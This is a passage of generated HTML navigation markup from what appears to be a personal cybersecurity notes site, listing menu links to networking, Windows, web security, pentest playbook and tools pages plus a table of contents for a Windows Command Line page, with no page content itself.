+    IMAP & POP3
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/IP%20Addressing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IP Addressing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/IPMI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IPMI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/LAN%20Topologies/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LAN Topologies
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/MSSQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MSSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/MySQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MySQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/NFS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NFS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/Network%20Media%20%26%20Connections/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Media & Connections
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/Networking%20Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Networking Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/OSI%20Model/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OSI Model
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/Oracle%20TNS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Oracle TNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/Packets%20and%20Frames/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Packets and Frames
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/Ports/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ports
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/Protocols/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protocols
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/SMB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SMB
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/SMTP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SMTP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/SNMP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SNMP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/Subnetting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Subnetting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/TLS%20%26%20SSL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TLS & SSL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/VPN%20Basics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    VPN Basics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_6" id="__nav_2_1_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Offensive Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Offensive Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Offensive%20Security/Footprinting%20%26%20Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Footprinting & Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Offensive%20Security/Offensive%20Security%20Intro/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Offensive Security Intro
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Offensive%20Security/Pentesting%20Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pentesting Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_7" id="__nav_2_1_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Operating Systems
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Operating Systems
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Boot%20and%20File%20Systems/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Boot and File Systems
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Containerization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Containerization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Operating%20System%20Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Operating System Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Operating%20System%20Internals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Operating System Internals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Solaris/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Solaris
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_7_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_7_6" id="__nav_2_1_7_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_1_7_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_7_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Linux
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/Linux%20File%20System/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux File System
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/Linux%20Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/Linux%20Hardening/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Hardening
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/Linux%20Networking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Networking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/Linux%20Shells/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Shells
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/Linux%20System%20Management/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux System Management
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/Shell%20Scripting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shell Scripting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_7_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_7_7" id="__nav_2_1_7_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_1_7_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1_7_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Windows
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Event%20Tracing%20for%20Windows%20%28ETW%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Status/In-Progress #Type/Knowledge #Context/Windows #publish-me
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Command Line
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Command Line
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#terminology" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Terminology
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#core-concepts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Core Concepts
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Core Concepts">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#accessing-cmd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Accessing CMD
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getting-help-history" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Getting Help &amp; History
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#system-information" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        System Information
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-system-navigation-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File System Navigation &amp; Management
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#environment-variables" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Environment Variables
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network-diagnostics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network Diagnostics
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#user-privilege-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        User &amp; Privilege Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#share-network-resource-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Share &amp; Network Resource Management
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-permissions-icacls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File Permissions — icacls
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#process-service-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Process &amp; Service Overview
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#service-management-sc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Service Management — sc
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#registry-reg" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Registry — reg
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scheduled-tasks-schtasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scheduled Tasks — schtasks
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wmi-wmic" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WMI — wmic
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows-event-log" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows Event Log
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gui-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GUI Access
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#quick-reference-workflows" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Quick Reference Workflows
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#related-concepts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Related Concepts
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#related-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Related Techniques
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#related-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Related Tools
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references-images" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References / Images
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20Event%20Logs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Status/In-Progress #Type/Knowledge #Context/Windows #publish-me
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20PowerShell/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows PowerShell
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20Remote%20Management/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Remote Management
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_7_7_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_7_7_7" id="__nav_2_1_7_7_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_2_1_7_7_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_7_7_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Active Directory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Active%20Directory/Active%20Directory%20Basics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory Basics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_8" id="__nav_2_1_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Web%20Security/JavaScript%20Essentials/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JavaScript Essentials
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Web%20Security/OWASP%20Top%2010%20-%202021/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OWASP Top 10   2021
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Web%20Security/SQL%20Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Web%20Security/Website%20Innerworkings/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Website Innerworkings
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Web%20Security/WordPress/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Status/In-Progress #Type/Knowledge #Context/Web #publish-me
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Playbooks
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Playbooks
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Playbooks/Linux%20Forensics%20Playbook/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Forensics Playbook
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Playbooks/Linux%20Pentest%20Playbook/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Pentest Playbook
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Playbooks/OSINT%20Playbook/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OSINT Playbook
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Playbooks/Windows%20Pentest%20Playbook/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Pentest Playbook
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Techniques
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Techniques
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Techniques/WordPress%20Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Status/In-Progress #Type/Technique #Context/Redteam #Context/Web #publish-me
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tools
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Tools
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
